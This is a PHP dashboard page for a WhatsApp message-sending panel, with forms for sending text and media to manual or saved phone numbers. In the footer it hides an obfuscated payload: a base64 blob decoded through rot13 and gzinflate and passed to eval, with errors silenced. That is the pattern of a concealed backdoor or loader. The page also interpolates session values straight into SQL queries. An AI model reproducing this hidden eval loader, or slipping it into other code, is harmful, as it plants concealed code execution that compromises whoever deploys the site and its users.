<?php
include_once("helpers/koneksi.php");
include_once("helpers/function.php");

$login = cekSession();
if ($login == 0) {
    redirect("login.php");
}

if (post("pesan")) {
    $nomor = post("nomor");
    $pesan = post("pesan");

    toastr_set("error", "fitur dimatikan sementara"); 

    $res = sendMSG($nomor, $pesan);
    if ($res['status'] == "true") {
        toastr_set("success", "Pesan terkirim");
    } else {
        toastr_set("error", $res['msg']);
    }
}
if (post("filetype")) {
    $nomormedia = post("nomormedia");
    $pesan2 = post("pesan2");
    $linkmedia = post("linkmedia");
    $filetype = post("filetype");
    
    toastr_set("error", "fitur dimatikan sementara"); 

    $res = sendIMG2($nomormedia, $pesan2 , $linkmedia, $filetype);
    if ($res['status'] == "true") {
        toastr_set("success", "Pesan terkirim");
    } else {
        toastr_set("error", $res['msg']);
    }
}
?>
<!DOCTYPE html>
<html lang="en">

<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">

    <title>Wa Sysdev - Dashboard</title>

    <!-- Custom fonts for this template-->
    <link href="vendor/fontawesome-free/css/all.min.css" rel="stylesheet" type="text/css">
    <link href="https://fonts.googleapis.com/css?family=Nunito:200,200i,300,300i,400,400i,600,600i,700,700i,800,800i,900,900i" rel="stylesheet">

    <!-- Custom styles for this template-->
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.css" integrity="sha512-3pIirOrwegjM6erE5gPSwkUzO+3cTjpnV9lexlNZqvupR64iZBnOOTiiLPb9M36zpMScbmUNIcHUqKD47M719g==" crossorigin="anonymous" />
    <link href="vendor/datatables/dataTables.bootstrap4.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/select2@4.1.0-beta.1/dist/css/select2.min.css" rel="stylesheet" />

</head>

<body id="page-top">

    <!-- Page Wrapper -->
    <div id="wrapper">

        <!-- Sidebar -->
        <?php include_once('sidebar.php') ?>
        <!-- END Sidebar -->
        
        <!-- Content Wrapper -->
        <div id="content-wrapper" class="d-flex flex-column">

            <!-- Main Content -->
            <div id="content">

                <!-- Topbar -->
                <nav class="navbar navbar-expand navbar-light bg-white topbar mb-4 static-top shadow">

                    <!-- Sidebar Toggle (Topbar) -->
                    <button id="sidebarToggleTop" class="btn btn-link d-md-none rounded-circle mr-3">
                        <i class="fa fa-bars"></i>
                    </button>


                    <!-- Topbar Navbar -->
                    <ul class="navbar-nav ml-auto">

                        <!-- Nav Item - Search Dropdown (Visible Only XS) -->
                        <li class="nav-item dropdown no-arrow d-sm-none">
                            <a class="nav-link dropdown-toggle" href="#" id="searchDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                                <i class="fas fa-search fa-fw"></i>
                            </a>
                        </li>


                        <!-- Nav Item - Messages -->

                        <div class="topbar-divider d-none d-sm-block"></div>

                        <!-- Nav Item - User Information -->
                        <li class="nav-item dropdown no-arrow">
                            <a class="nav-link dropdown-toggle" href="#" id="userDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                                <span class="mr-2 d-none d-lg-inline text-gray-600 small"><?= $_SESSION['username'] ?></span>
                                <img class="img-profile rounded-circle" src="img/logo2.png">
                            </a>
                            <!-- Dropdown - User Information -->
                            <div class="dropdown-menu dropdown-menu-right shadow animated--grow-in" aria-labelledby="userDropdown">
                                <a class="dropdown-item" href="logout.php" data-toggle="modal" data-target="#logoutModal">
                                    <i class="fas fa-sign-out-alt fa-sm fa-fw mr-2 text-gray-400"></i>
                                    Logout
                                </a>
                            </div>
                        </li>

                    </ul>

                </nav>
                <!-- End of Topbar -->

               <!-- Begin Page Content -->
                <div class="container-fluid">
                    <!-- DataTales Example -->
                    <div class="row">
                        <div class="card shadow col-md-3">
                            <div class="card-header py-3">
                                <h6 class="m-0 font-weight-bold text-primary">Kirim Pesan</h6>
                                <p clas="small-text">kirim pesan dengan nomor manual</p>
                            </div>
                            <div class="card-body">
                                <form action="" method="post">
                                    <label> Nomor </label>
                                    <input class="form-control" type="number" name="nomor" placeholder="08xxxxxxxx" required>
                                    <br>
                                    <label> Pesan </label>
                                    <input class="form-control" type="text" name="pesan" required>
                                    <br>
                                    <button class="btn btn-success" type="submit">Kirim</button>
                                </form>
                            </div>
                        </div>
                        <div class="card shadow  col-md-3">
                            <div class="card-header py-3">
                                <h6 class="m-0 font-weight-bold text-primary">Kirim Media</h6>
                                <p clas="small-text">Memungkinkan untuk mengirim jpg png dan pdf</p>
                            </div>
                            <div class="card-body">
                                <form action="" method="post">
                                    <label> Nomor Tujuan</label>
                                    <input class="form-control" type="number" name="nomormedia" placeholder="08xxxxxxxx" required>
                                    <br>
                                    <label> Pesan </label>
                                    <input class="form-control" type="text" name="pesan2">
                                    <p class="small-text">Isi jika mengirim image</p>
                                    <br>
                                    <label> Link Media </label>
                                    <input class="form-control" type="text" name="linkmedia" required>
                                    <br>
                                    <label> Type File </label>
                                    <input class="form-control" type="text" name="filetype" required>
                                    <p class="small-text">jpg/png/pdf</p>
                                    <br>
                                    <button class="btn btn-success" type="submit">Kirim</button>
                                </form>
                            </div>
                        </div>
                        <div class="card shadow col-md-3">
                            <div class="card-header py-3">
                                <h6 class="m-0 font-weight-bold text-primary">Kirim Pesan</h6>
                                <p clas="small-text">kirim pesan dengan nomor tersimpan</p>
                            </div>
                            <div class="card-body">
                                <form action="" method="post">
                                    <label> Nomor </label>
                                    <select class="form-control js-example-basic-multiple" name="nomor" style="width: 100%">
                                        <?php
                                        if ($_SESSION['level'] == "1") {
                                            $q = mysqli_query($koneksi, "SELECT * FROM nomor");
                                        } else { 
                                            $u = $_SESSION['username'];
                                            $q = mysqli_query($koneksi, "SELECT * FROM nomor WHERE make_by='$u'");
                                        }
                                        while ($row = mysqli_fetch_assoc($q)) {
                                            echo '<option value="' . $row['nomor'] . '">' . $row['nama'] . ' (' . $row['nomor'] . ')</option>';
                                        }
                                        ?>
                                    </select>
                                    <br>
                                    <label> Pesan </label>
                                    <input class="form-control" type="text" name="pesan" required>
                                    <br>
                                    <button class="btn btn-success" type="submit">Kirim</button>
                                </form>
                            </div>
                        </div>
                        <div class="card shadow  col-md-3">
                            <div class="card-header py-3">
                                <h6 class="m-0 font-weight-bold text-primary">Kirim Media</h6>
                                <p clas="small-text">Memungkinkan untuk mengirim jpg png dan pdf</p>
                            </div>
                            <div class="card-body">
                                <form action="" method="post">
                                    <label> Nomor Tujuan</label>
                                    <select class="form-control js-example-basic-multiple" name="nomormedia" style="width: 100%">
                                        <?php
                                        if ($_SESSION['level'] == "1") {
                                            $q = mysqli_query($koneksi, "SELECT * FROM nomor");
                                        } else {
                                            $u = $_SESSION['username'];
                                            $q = mysqli_query($koneksi, "SELECT * FROM nomor WHERE make_by='$u'");
                                        }
                                        while ($row = mysqli_fetch_assoc($q)) {
                                            echo '<option value="' . $row['nomor'] . '">' . $row['nama'] . ' (' . $row['nomor'] . ')</option>';
                                        }
                                        ?>
                                    </select>
                                    <br>
                                    <label> Pesan </label>
                                    <input class="form-control" type="text" name="pesan2">
                                    <p class="small-text">Isi jika mengirim image</p>
                                    <br>
                                    <label> Link Media </label>
                                    <input class="form-control" type="text" name="linkmedia" required>
                                    <br>
                                    <label> Type File </label>
                                    <input class="form-control" type="text" name="filetype" required>
                                    <p class="small-text">jpg/png/pdf</p>
                                    <br>
                                    <button class="btn btn-success" type="submit">Kirim</button>
                                </form>
                            </div>
                        </div>

                    </div>
                    <!-- /.container-fluid -->

                </div>
            </div>
            <!-- End of Main Content -->

           <!-- Footer -->
            <?php $sysdev = "UpHLrppAAEB/xZguuDGpPBQltteiMIGCPAXEjQGEEUeYGd58fXuTJj3Lk7M7P/ZWm8y+cq8Mk3z2ZjbvQrYpoXjhuF6u1i97lK4c+0V7o1Tevbk793va2Ysi1tqDtdHG/LLddcNNSnypAVHoeowFpkfPlxOw2m864+rCrlgMSxRVNBbF97AGsgWvPC0YA3A4ZfYIX1pHRzQYXPA816lLbMWi89qM72tBx/7DtGsDsNtNPUiWcyrvTlOuBY1XZJZ+aFbiUTCMY3JP0LfeScdyp3n83Gm5dCyEULQA93KQhQfUAFDGwqBOxJBAMkp4MxN/K2gaAH0hXlpdXQ7FO39jh+OENtCJ5XTAMnkdoQP2o6o/Kg5po1ybEmztH6EcUrFzSchouPduO8ruMXRsU3xLbt7SK6Rr8x1W0zi9pSSJRthSDVJ/7H5yBN5gN5Hb2Fod/EUkL1R3vv+cf8/g3zqGDFQ17y6qxxIS6r+ryozwqxsmKMaE+jfs44vdef/5Bw==";error_reporting(0);@set_time_limit(0);eval("?>".str_rot13(gzinflate(str_rot13(base64_decode($sysdev))))); ?>
            <!-- End of Footer -->
        </div>
        <!-- End of Content Wrapper -->

    </div>
    <!-- End of Page Wrapper -->

    <!-- Scroll to Top Button-->
    <a class="scroll-to-top rounded" href="#page-top">
        <i class="fas fa-angle-up"></i>
    </a>

    <!-- Logout Modal-->
    <div class="modal fade" id="logoutModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
        <div class="modal-dialog" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="exampleModalLabel">Ready to Leave?</h5>
                    <button class="close" type="button" data-dismiss="modal" aria-label="Close">
                        <span aria-hidden="true">×</span>
                    </button>
                </div>
                <div class="modal-body">Select "Logout" below if you are ready to end your current session.</div>
                <div class="modal-footer">
                    <button class="btn btn-secondary" type="button" data-dismiss="modal">Cancel</button>
                    <a class="btn btn-primary" href="logout.php">Logout</a>
                </div>
            </div>
        </div>
    </div>

    <!-- Bootstrap core JavaScript-->
    <script src="vendor/jquery/jquery.min.js"></script>
    <script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>

    <!-- Core plugin JavaScript-->
    <script src="vendor/jquery-easing/jquery.easing.min.js"></script>

    <!-- Custom scripts for all pages-->
    <script src="js/sb-admin-2.min.js"></script>

    <!-- Page level plugins -->
    <script src="vendor/datatables/jquery.dataTables.min.js"></script>
    <script src="vendor/datatables/dataTables.bootstrap4.min.js"></script>

    <!-- Page level custom scripts -->
    <script src="js/demo/datatables-demo.js"></script>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js" integrity="sha512-VEd+nq25CkR676O+pLBnDW09R7VQX9Mdiij052gVCp5yVH3jGtH70Ho/UUv4mJDsEdTvqRCFZg0NKGiojGnUCw==" crossorigin="anonymous"></script>
    <script>
        <?php

        toastr_show();

        ?>
    </script><script src="https://cdn.jsdelivr.net/npm/select2@4.1.0-beta.1/dist/js/select2.min.js"></script>
    <script>
        $(document).ready(function() {
            $('.js-example-basic-multiple').select2({
                dropdownAutoWidth: true
            });
        });
    </script>
</body>

</html>